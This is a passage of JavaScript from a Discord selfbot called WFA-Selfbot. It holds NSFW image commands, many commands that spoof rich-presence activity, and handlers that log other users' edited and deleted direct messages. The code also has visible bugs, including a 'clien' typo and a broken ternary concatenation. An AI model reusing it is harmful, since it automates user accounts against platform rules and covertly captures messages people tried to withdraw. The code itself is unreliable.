          if (
            !a4.guild.emojis.forEach((cL) => {
              if (!cL.i === cK.id) {
                return a4.channel.send(
                  ':x: **This emote is not on the server**.'
                )
              }
            })
          ) {
            return a4.edit(
              ':white_check_mark: **Emote correctement supprimée du serveur.**'
            )
          }
          if (cK.id) {
            const cL =
              'https://cdn.discordapp.com/emojis/' + cK.id + '.' + cK.animated
                ? 'gif'
                : 'png'
            a4.guild.emojis.get(cK.id).delete()
          } else {
            let cM = parse(cJ, { assetType: 'png' })
            if (!cM[0]) {
              return a4.edit(':x: **Please choose a valid emote**!')
            }
            a4.edit(":x: **You can't delete emotes by default**!")
          }
          console.log(
            consolecolor.instagram('[COMMAND] remove emote command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'ass')) {
          if (nsfw === 'on') {
            const cN = { type: 'ass' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cN)
              .end((cO, cP) => {
                a8.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' +
                    cP.body.message +
                    '\n'
                ).catch((cQ) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'an error has occurred that I cannot fix'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMAND] ass command executed')
                )
              })
          } else {
            a4.delete().catch((cP) => {}),
              console.log('[NSFW]'.red + ' NSFW commands are disabled'.green)
          }
        }
        if (a4.content.startsWith(prefix + '4k')) {
          if (nsfw === 'on') {
            const cQ = { type: '4k' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cQ)
              .end((cR, cS) => {
                a8.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' +
                    cS.body.message +
                    '\n'
                ).catch((cW) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'an error has occurred that I cannot fix'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMAND] 4k command executed')
                )
              })
          } else {
            a4.delete().catch((cR) => {})
            console.log('[NSFW]'.red + ' NSFW commands are disabled'.green)
          }
        }
        if (a4.content.startsWith(prefix + 'nsfw-gif')) {
          if (nsfw === 'on') {
            const cR = { type: 'pgif' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cR)
              .end((cS, cT) => {
                a8.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' +
                    cT.body.message +
                    '\n'
                ).catch((cW) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'an error has occurred that I cannot fix'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMAND] nsfw gif command executed')
                )
              })
          } else {
            a4.delete().catch((cT) => {})
            console.log('[NSFW]'.red + ' NSFW commands are disabled'.green)
          }
        }
        if (a4.content.startsWith(prefix + 'hentai')) {
          nsfw === 'on'
            ? superagent
                .get('https://nekobot.xyz/api/image')
                .query({ type: 'hentai_anal' })
                .end((cU, cV) => {
                  a8.edit(
                    ghost +
                      'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' +
                      cV.body.message +
                      '\n'
                  ).catch((cW) =>
                    console.log(
                      '[',
                      'ERROR'.red,
                      ']',
                      'an error has occurred that I cannot fix'.green
                    )
                  )
                  console.log(
                    consolecolor.instagram('[COMMAND] hentai command executed')
                  )
                })
            : (a4.delete().catch((cU) => {}),
              console.log('[NSFW]'.red + ' NSFW commands are disabled'.green))
        }
        if (a4.content.startsWith(prefix + 'pussy')) {
          if (nsfw === 'on') {
            const cW = { type: 'pussy' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cW)
              .end((cX, cY) => {
                a8.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' +
                    cY.body.message +
                    '\n'
                ).catch((cZ) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'an error has occurred that I cannot fix'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMAND] pussy command executed')
                )
              })
          } else {
            a4.delete().catch((cX) => {})
            console.log('[NSFW]'.red + ' NSFW commands are disabled'.green)
          }
        }
        if (a4.content.startsWith(prefix + 'thigh')) {
          if (nsfw === 'on') {
            const cY = { type: 'thigh' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cY)
              .end((cZ, d0) => {
                a8
                  .edit(
                    ghost +
                      ('https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' +
                        d0.body.message)
                  )
                  .catch((d2) =>
                    console.log(
                      '[',
                      'ERROR'.red,
                      ']',
                      'an error has occurred that I cannot fix'.green
                    )
                  ),
                  console.log(
                    consolecolor.instagram('[COMMAND] thigh command executed')
                  )
              })
          } else {
            a4.delete().catch((cZ) => {})
            console.log('[NSFW]'.red + ' NSFW commands are disabled'.green)
          }
        }
        a4.content.startsWith(prefix + 'anal') &&
          (nsfw === 'on'
            ? superagent
                .get('https://nekobot.xyz/api/image')
                .query({ type: 'anal' })
                .end((cZ, d0) => {
                  a8
                    .edit(
                      ghost +
                        'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' +
                        d0.body.message +
                        '\n'
                    )
                    .catch((d2) =>
                      console.log(
                        '[',
                        'ERROR'.red,
                        ']',
                        'an error has occurred that I cannot fix'.green
                      )
                    ),
                    console.log(
                      consolecolor.instagram('[COMMAND] anal command executed')
                    )
                })
            : (a4.delete().catch((cZ) => {}),
              console.log('[NSFW]'.red + ' NSFW commands are disabled'.green)))
        if (a4.content.startsWith(prefix + 'spotify')) {
          const cZ = a4.content.split(' ').slice(1).join(' ') || h
          let d0 = rpcGenerator
            .createSpotifyRpc(client)
            .setAssetsLargeImage(
              'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e'
            )
            .setAssetsSmallImage(
              'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e'
            )
            .setDetails(cZ)
            .setState(client.user.username)
            .setStartTimestamp(Date.now())
            .setEndTimestamp(Date.now() + 86400000)
          client.user
            .setPresence(d0.toDiscord())
            .then(
              a4.edit(':white_check_mark: **You listen ' + cZ + ' on spotify**')
            )
            .catch(console.error)
          console.log(
            consolecolor.instagram('[COMMAND] spotify command executed')
          )
        }
        a4.content.startsWith(prefix + 'reset') &&
          (clearInterval(),
          client.user.setActivity(null, {}),
          a4
            .edit(
              ':information_source:  Votre statut a été réinitialisé ! :information_source:'
            )
            .catch((d1) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            ),
          console.log(
            consolecolor.instagram('[COMMAND] reset command executed')
          ))
        if (a4.content.startsWith(prefix + 'gucci')) {
          let d1 = a6.splice(1).join(' ') || h
          rpcGenerator
            .getRpcImages('603405368940429315', 'gucci')
            .then((d2) => {
              rpcGenerator
                .getRpcImages('603405368940429315', 'gucci0')
                .then((d4) => {
                  let d5 = new rpcGenerator.Rpc()
                    .setName('Gucci')
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType('WATCHING')
                    .setApplicationId('603405368940429315')
                    .setDetails('Gucci')
                    .setAssetsLargeImage(d2.id)
                    .setAssetsSmallImage(d4.id)
                    .setAssetsLargeText(client.user.username)
                    .setState(d1)
                    .setStartTimestamp(Date.now())
                    .setParty({ id: uuid() })
                  client.user.setPresence(d5.toDiscord()).catch((d6) => {})
                  console.log(
                    consolecolor.instagram('[COMMAND] gucci command executed')
                  )
                  a4.edit(
                    ':white_check_mark: **You watch ' + d1 + ' on Gucci**'
                  )
                })
            })
        }
        if (a4.content.startsWith(prefix + 'lacoste')) {
          let d2 = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'lacoste')
            .then((d3) => {
              let d6 = new rpcGenerator.Rpc()
                .setName('Lacoste')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Lacoste')
                .setAssetsLargeImage(d3.id)
                .setAssetsLargeText(client.user.username)
                .setState(d2)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(d6.toDiscord()).catch((d7) => {})
              console.log(
                consolecolor.instagram('[COMMAND] lacoste command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + d2 + ' on lacoste**')
            })
        }
        if (a4.content.startsWith(prefix + 'nike')) {
          let d4 = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImages('603405368940429315', 'nike').then((d5) => {
            let d6 = new rpcGenerator.Rpc()
              .setName('Nike')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('WATCHING')
              .setApplicationId('603405368940429315')
              .setDetails('Nike')
              .setAssetsLargeImage(d5.id)
              .setAssetsLargeText(client.user.username)
              .setState(d4)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            clien.user.setPresence(d6.toDiscord()).catch((d7) => {})
            console.log(
              consolecolor.instagram('[COMMAND] nike command executed')
            )
            a4.edit(':white_check_mark: **You watch ' + d4 + ' on Nike**')
          })
        }
        if (a4.content.startsWith(prefix + 'google')) {
          let d5 = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'google')
            .then((d6) => {
              let d7 = new rpcGenerator.Rpc()
                .setName('Google')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Google')
                .setAssetsLargeImage(d6.id)
                .setAssetsLargeText(client.user.username)
                .setState(d5)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(d7.toDiscord()).catch((d8) => {})
              console.log(
                consolecolor.instagram('[COMMAND] google command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + d5 + ' on google**')
            })
        }
        if (a4.content.startsWith(prefix + 'skype')) {
          let d6 = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'skype')
            .then((d7) => {
              let d8 = new rpcGenerator.Rpc()
                .setName('Skype')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Skype')
                .setAssetsLargeImage(d7.id)
                .setAssetsLargeText(client.user.username)
                .setState(d6)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(d8.toDiscord()).catch((d9) => {})
              console.log(
                consolecolor.instagram('[COMMAND] skype command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + d6 + ' on Skype**')
            })
        }
        if (a4.content.startsWith(prefix + 'snapchat')) {
          let d7 = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'snapchat')
            .then((d8) => {
              let dc = new rpcGenerator.Rpc()
                .setName('Snapchat')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Snapchat')
                .setAssetsLargeImage(d8.id)
                .setAssetsLargeText(client.user.username)
                .setState(d7)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dc.toDiscord()).catch((dd) => {})
              console.log(
                consolecolor.instagram('[COMMAND] snapchat command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + d7 + ' on Snapchat**')
            })
        }
        if (a4.content.startsWith(prefix + 'facebook')) {
          let d8 = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'facebook')
            .then((d9) => {
              let dc = new rpcGenerator.Rpc()
                .setName('Facebook')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Skype')
                .setAssetsLargeImage(d9.id)
                .setAssetsLargeText(client.user.username)
                .setState(d8)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dc.toDiscord()).catch((dd) => {})
              console.log(
                consolecolor.instagram('[COMMAND] facebook command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + d8 + ' on Facebook**')
            })
        }
        if (a4.content.startsWith(prefix + 'tiktok')) {
          let da = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'tiktok')
            .then((dc) => {
              let de = new rpcGenerator.Rpc()
                .setName('Tiktok')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Tiktok')
                .setAssetsLargeImage(dc.id)
                .setAssetsLargeText(client.user.username)
                .setState(da)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(de.toDiscord()).catch((df) => {})
              console.log(
                consolecolor.instagram('[COMMAND] tiktok command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + da + ' on Tiktok**')
            })
        }
        if (a4.content.startsWith(prefix + 'twitter')) {
          let dc = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'twitter')
            .then((dd) => {
              let de = new rpcGenerator.Rpc()
                .setName('Twitter')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Twitter')
                .setAssetsLargeImage(dd.id)
                .setAssetsLargeText(client.user.username)
                .setState(dc)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(de.toDiscord()).catch((df) => {})
              console.log(
                consolecolor.instagram('[COMMAND] twitter command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + dc + ' on Twitter**')
            })
        }
        if (a4.content.startsWith(prefix + 'instagram')) {
          let dd = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'instagram')
            .then((de) => {
              let df = new rpcGenerator.Rpc()
                .setName('Instagram')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Instagram')
                .setAssetsLargeImage(de.id)
                .setAssetsLargeText(client.user.username)
                .setState(dd)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(df.toDiscord()).catch((dg) => {})
              console.log(
                consolecolor.instagram('[COMMAND] instagram command executed')
              )
              a4.edit(
                ':white_check_mark: **You watch ' + dd + ' on Instagram**'
              )
            })
        }
        if (a4.content.startsWith(prefix + 'youtube')) {
          let de = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'youtube')
            .then((df) => {
              let dg = new rpcGenerator.Rpc()
                .setName('Youtube')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Youtube')
                .setAssetsLargeImage(df.id)
                .setAssetsLargeText(client.user.username)
                .setState(de)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dg.toDiscord()).catch((dh) => {})
              console.log(
                consolecolor.instagram('[COMMAND] youtube command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + de + ' on Youtube**')
            })
        }
        if (a4.content.startsWith(prefix + 'tokyo ghoul')) {
          let df = a6.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'tokyo').then((dg) => {
            let dh = new rpcGenerator.Rpc()
              .setName('Tokyo Ghoul')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('WATCHING')
              .setApplicationId('603405368940429315')
              .setDetails('Tokyo Ghoul')
              .setAssetsLargeImage(dg.id)
              .setAssetsLargeText(client.user.username)
              .setState(df)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(dh.toDiscord()).catch((di) => {})
            console.log(
              consolecolor.instagram('[COMMAND] tokyo ghoul command executed')
            )
            a4.edit(
              ':white_check_mark: **You watch ' + df + ' on Tokyo Ghoul**'
            )
          })
        }
        if (a4.content.startsWith(prefix + 'hunter x hunter')) {
          let dg = a6.splice(3).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'hxh').then((dh) => {
            let di = new rpcGenerator.Rpc()
              .setName('Hunter X Hunter')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('WATCHING')
              .setApplicationId('603405368940429315')
              .setDetails('Hunter X Hunter')
              .setAssetsLargeImage(dh.id)
              .setAssetsLargeText(client.user.username)
              .setState(dg)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(di.toDiscord()).catch((dj) => {})
            console.log(
              consolecolor.instagram(
                '[COMMAND] hunter x hunter command executed'
              )
            )
            a4.edit(
              ':white_check_mark: **You watch ' + dg + ' on Hunter X Hunter**'
            )
          })
        }
        if (a4.content.startsWith(prefix + 'naruto')) {
          let dh = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('721465320740487179', 'naruto')
            .then((di) => {
              let dj = new rpcGenerator.Rpc()
                .setName('Naruto')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('721465320740487179')
                .setDetails('Naruto')
                .setAssetsLargeImage(di.id)
                .setAssetsLargeText(client.user.username)
                .setState(dh)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dj.toDiscord()).catch((dk) => {})
              console.log(
                consolecolor.instagram('[COMMAND] naruto command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + dh + ' on Naruto**')
            })
        }
        if (a4.content.startsWith(prefix + 'pornhub')) {
          let di = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'pornhub')
            .then((dj) => {
              let dn = new rpcGenerator.Rpc()
                .setName('Pornhub')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Pornhub')
                .setAssetsLargeImage(dj.id)
                .setAssetsLargeText(client.user.username)
                .setState(di)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dn.toDiscord()).catch((dp) => {})
              console.log(
                consolecolor.instagram('[COMMAND] pornhub command executed')
              )
              a4.edit(':white_check_mark: **You watch ' + di + ' on Pornhub**')
            })
        }
        if (a4.content.startsWith(prefix + 'clash of clan')) {
          let dj = a6.splice(3).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('721465320740487179', 'clash-of-clans-app-icon')
            .then((dk) => {
              let dl = new rpcGenerator.Rpc()
                .setName('Clash Of Clan')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('721465320740487179')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dk.id)
                .setAssetsLargeText(client.user.username)
                .setState(dj)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dl.toDiscord()).catch((dm) => {})
              console.log(
                consolecolor.instagram(
                  '[COMMAND] clash of clans command executed'
                )
              )
              a4.edit(
                ':white_check_mark: **You play ' + dj + ' on Clash Of Clan**'
              )
            })
        }
        if (a4.content.startsWith(prefix + 'minecraft')) {
          let dk = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'minecraft')
            .then((dl) => {
              let dp = new rpcGenerator.Rpc()
                .setName('Minecraft')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dl.id)
                .setAssetsLargeText(client.user.username)
                .setState(dk)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dp.toDiscord()).catch((dq) => {})
              console.log(
                consolecolor.instagram('[COMMAND] minecraft command executed')
              )
              a4.edit(':white_check_mark: **You play ' + dk + ' on Minecraft**')
            })
        }
        if (a4.content.startsWith(prefix + 'clash royal')) {
          let dl = a6.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'clashroyal')
            .then((dm) => {
              let dn = new rpcGenerator.Rpc()
                .setName('Clash Royal')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dm.id)
                .setAssetsLargeText(client.user.username)
                .setState(dl)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dn.toDiscord()).catch((dp) => {})
              console.log(
                consolecolor.instagram(
                  '[COMMAND] clash royale command executed'
                )
              )
              a4.edit(
                ':white_check_mark: **You play ' + dl + ' on Clash Royal**'
              )
            })
        }
        if (a4.content.startsWith(prefix + 'tinder')) {
          let dm = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'tinder')
            .then((dn) => {
              let dq = new rpcGenerator.Rpc()
                .setName('Tinder')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dn.id)
                .setAssetsLargeText(client.user.username)
                .setState(dm)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dq.toDiscord()).catch((dr) => {})
              console.log(
                consolecolor.instagram('[COMMAND] tinder command executed')
              )
              a4.edit(':white_check_mark: **You play ' + dm + ' on Tinder**')
            })
        }
        if (a4.content.startsWith(prefix + 'roblox')) {
          let dn = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'roblox')
            .then((dp) => {
              let dq = new rpcGenerator.Rpc()
                .setName('Roblox')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dp.id)
                .setAssetsLargeText(client.user.username)
                .setState(dn)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dq.toDiscord()).catch((dr) => {})
              console.log(
                consolecolor.instagram('[COMMAND] roblox command executed')
              )
              a4.edit(':white_check_mark: **You play ' + dn + ' on Roblox**')
            })
        }
        if (a4.content.startsWith(prefix + 'badlion')) {
          let dp = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'badlion')
            .then((dq) => {
              let dr = new rpcGenerator.Rpc()
                .setName('Badlion')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dq.id)
                .setAssetsLargeText(client.user.username)
                .setState(dp)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dr.toDiscord()).catch((ds) => {})
              console.log(
                consolecolor.instagram('[COMMAND] badlion command executed')
              )
              a4.edit(':white_check_mark: **You play ' + dp + ' on Badlion**')
            })
        }
        if (a4.content.startsWith(prefix + 'apex')) {
          let dq = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'apex').then((dr) => {
            let ds = new rpcGenerator.Rpc()
              .setName('Apex Legends')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('PLAYING')
              .setApplicationId('603405368940429315')
              .setDetails('WFA-Selfbot')
              .setAssetsLargeImage(dr.id)
              .setAssetsLargeText(client.user.username)
              .setState(dq)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(ds.toDiscord()).catch((dt) => {})
            console.log(
              consolecolor.instagram('[COMMAND] apex command executed')
            )
            a4.edit(
              ':white_check_mark: **You play ' + dq + ' on Apex Legends**'
            )
          })
        }
        if (a4.content.startsWith(prefix + 'csgo')) {
          let ds = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'csgo').then((dt) => {
            let dw = new rpcGenerator.Rpc()
              .setName('Counter Strike')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('PLAYING')
              .setApplicationId('603405368940429315')
              .setDetails('WFA-Selfbot')
              .setAssetsLargeImage(dt.id)
              .setAssetsLargeText(client.user.username)
              .setState(ds)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(dw.toDiscord()).catch((dx) => {})
            console.log(
              consolecolor.instagram('[COMMAND] csgo command executed')
            )
            a4.edit(':white_check_mark: **You play ' + ds + ' on csgo**')
          })
        }
        if (a4.content.startsWith(prefix + 'among us')) {
          let du = a6.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'amongus')
            .then((dv) => {
              let dw = new rpcGenerator.Rpc()
                .setName('Among us')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dv.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(du)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dw.toDiscord()).catch((dx) => {})
              console.log(
                consolecolor.instagram('[COMMAND] among us command executed')
              )
              a4.edit(':white_check_mark: **You play ' + du + ' on among us**')
            })
        }
        if (a4.content.startsWith(prefix + 'fortnite')) {
          let dv = a6.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'fortnite')
            .then((dw) => {
              let dy = new rpcGenerator.Rpc()
                .setName('Fortnite')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA Selfbot')
                .setAssetsLargeImage(dw.id)
                .setAssetsLargeText('WFA-Selfbot E')
                .setState(dv)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dy.toDiscord()).catch((dz) => {})
              console.log(
                consolecolor.instagram('[COMMAND] fortnite command executed')
              )
              a4.edit(':white_check_mark: **You play ' + dv + ' on fortnite**')
            })
        }
        if (a4.content.startsWith(prefix + 'rocket league')) {
          let dw = a6.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'rocket_league')
            .then((dx) => {
              let dy = new rpcGenerator.Rpc()
                .setName('Rocket League')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                .setApplicationId('603405368940429315')
                .setDetails('WFA Selfbot')
                .setAssetsLargeImage(dx.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dw)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dy.toDiscord()).catch((dz) => {})
              console.log(
                consolecolor.instagram(
                  '[COMMAND] rocket league command executed'
                )
              )
              a4.edit(
                ':white_check_mark: **You play ' + dw + ' on rocket league**'
              )
            })
        }
      })
      client.on('messageUpdate', (a4) => {
        if (a4.author.id === client.user.id) {
          return
        }
        if (a4.channel.type === 'dm') {
          console.log(' ')
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(consolecolor.atlas('[EVENT] Modified dm:'))
          console.log(consolecolor.atlas('[EVENT] User: ' + a4.author.tag))
          console.log(consolecolor.atlas('[EVENT] Content: ' + a4.content))
          console.log(consolecolor.atlas('[EVENT] At: ' + a4.createdAt))
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(' ')
        }
      })
      client.on('messageDelete', (a4) => {
        if (a4.author.id === client.user.id) {
          return
        }
        if (a4.channel.type === 'dm') {
          console.log(' ')
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(consolecolor.atlas('[EVENT] Deleted dm:'))
          console.log(consolecolor.atlas('[EVENT] User: ' + a4.author.tag))
          console.log(consolecolor.atlas('[EVENT] Content: ' + a4.content))
          console.log(consolecolor.atlas('[EVENT] At: ' + a4.createdAt))
          console.log(
            consolecolor.fruit(
